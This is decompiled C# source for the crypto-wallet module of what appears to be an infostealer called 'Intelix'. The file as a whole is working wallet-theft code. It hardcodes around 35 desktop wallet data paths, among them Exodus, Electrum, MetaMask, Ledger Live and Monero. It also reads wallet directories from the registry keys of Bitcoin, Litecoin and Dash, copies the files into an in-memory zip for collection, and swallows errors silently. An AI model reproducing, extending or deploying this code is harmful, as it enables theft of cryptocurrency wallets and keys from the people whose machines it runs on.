using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using Intelix.Helper.Data;
using Microsoft.Win32;

namespace Intelix.Targets.Crypto
{
	// Token: 0x02000035 RID: 53
	public class CryptoDesktop : ITarget
	{
		// Token: 0x060000A4 RID: 164 RVA: 0x00009034 File Offset: 0x00007234
		public void Collect(InMemoryZip zip, Counter counter)
		{
			try
			{
				Parallel.ForEach<string[]>(CryptoDesktop.SWalletsDirectories, delegate(string[] sw)
				{
					this.CopyWalletFromDirectoryTo(sw[1], sw[0], zip, counter);
				});
				Parallel.ForEach<string>(CryptoDesktop.SWalletsRegistry, delegate(string sWalletRegistry)
				{
					this.CopyWalletFromRegistryTo(sWalletRegistry, zip, counter);
				});
			}
			catch
			{
			}
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x000090A4 File Offset: 0x000072A4
		private void CopyWalletFromDirectoryTo(string sWalletDir, string sWalletName, InMemoryZip zip, Counter counter)
		{
			bool flag = Directory.Exists(sWalletDir);
			if (flag)
			{
				zip.AddDirectoryFiles(sWalletDir, sWalletName, true);
				counter.CryptoDesktop.Add(sWalletDir + " => " + sWalletName);
			}
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x000090E4 File Offset: 0x000072E4
		private void CopyWalletFromRegistryTo(string sWalletRegistry, InMemoryZip zip, Counter counter)
		{
			try
			{
				string name = string.Concat(new string[]
				{
					"Software\\",
					sWalletRegistry,
					"\\",
					sWalletRegistry,
					"-Qt"
				});
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
				string text;
				if (registryKey == null)
				{
					text = null;
				}
				else
				{
					object value = registryKey.GetValue("strDataDir");
					text = ((value != null) ? value.ToString() : null);
				}
				string text2 = text;
				bool flag = text2 != null;
				if (flag)
				{
					string text3 = Path.Combine(text2, "wallets");
					bool flag2 = Directory.Exists(text3);
					if (flag2)
					{
						zip.AddDirectoryFiles(text3, sWalletRegistry, true);
						counter.CryptoDesktop.Add(text3 + " => " + sWalletRegistry);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000008 RID: 8
		private static readonly List<string[]> SWalletsDirectories = new List<string[]>
		{
			new string[]
			{
				"Zcash",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Zcash")
			},
			new string[]
			{
				"Armory",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Armory")
			},
			new string[]
			{
				"Bytecoin",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "bytecoin")
			},
			new string[]
			{
				"Jaxx",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb")
			},
			new string[]
			{
				"Exodus",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Exodus", "exodus.wallet")
			},
			new string[]
			{
				"Ethereum",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Ethereum", "keystore")
			},
			new string[]
			{
				"Electrum",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Electrum", "wallets")
			},
			new string[]
			{
				"AtomicWallet",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "atomic", "Local Storage", "leveldb")
			},
			new string[]
			{
				"Atomic",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Atomic", "Local Storage", "leveldb")
			},
			new string[]
			{
				"Guarda",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Guarda", "Local Storage", "leveldb")
			},
			new string[]
			{
				"Coinomi",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Coinomi", "Coinomi", "wallets")
			},
			new string[]
			{
				"Tari",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "com.tari.universe", "app_configs", "mainnet")
			},
			new string[]
			{
				"Tari",
				Path.Combine(new string[]
				{
					Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
					"com.tari.universe",
					"wallet",
					"mainnet",
					"data",
					"wallet"
				})
			},
			new string[]
			{
				"Bitcoin",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Bitcoin", "wallets")
			},
			new string[]
			{
				"Bitcoin",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Bitcoin", "wallets")
			},
			new string[]
			{
				"Dash",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DashCore", "wallets")
			},
			new string[]
			{
				"Litecoin",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Litecoin", "wallets")
			},
			new string[]
			{
				"MyMonero",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MyMonero")
			},
			new string[]
			{
				"Monero",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Monero")
			},
			new string[]
			{
				"Vertcoin",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Vertcoin")
			},
			new string[]
			{
				"Groestlcoin",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Groestlcoin")
			},
			new string[]
			{
				"Komodo",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Komodo")
			},
			new string[]
			{
				"PIVX",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "PIVX")
			},
			new string[]
			{
				"BitcoinGold",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "BitcoinGold")
			},
			new string[]
			{
				"Electrum-LTC",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Electrum-LTC")
			},
			new string[]
			{
				"Binance",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Binance")
			},
			new string[]
			{
				"Phantom",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Phantom", "IndexedDB", "file__0.indexeddb.leveldb")
			},
			new string[]
			{
				"Coin98",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Coin98", "IndexedDB", "file__0.indexeddb.leveldb")
			},
			new string[]
			{
				"MathWallet",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MathWallet", "IndexedDB", "file__0.indexeddb.leveldb")
			},
			new string[]
			{
				"LedgerLive",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Ledger Live")
			},
			new string[]
			{
				"TrezorSuite",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "TrezorSuite")
			},
			new string[]
			{
				"MyEtherWallet",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MyEtherWallet")
			},
			new string[]
			{
				"MyCrypto",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MyCrypto")
			},
			new string[]
			{
				"MetaMask",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MetaMask", "IndexedDB", "file__0.indexeddb.leveldb")
			},
			new string[]
			{
				"TrustWallet",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "TrustWallet", "IndexedDB", "file__0.indexeddb.leveldb")
			}
		};

		// Token: 0x04000009 RID: 9
		private static readonly string[] SWalletsRegistry = new string[]
		{
			"Litecoin",
			"Dash",
			"Bitcoin"
		};
	}
}
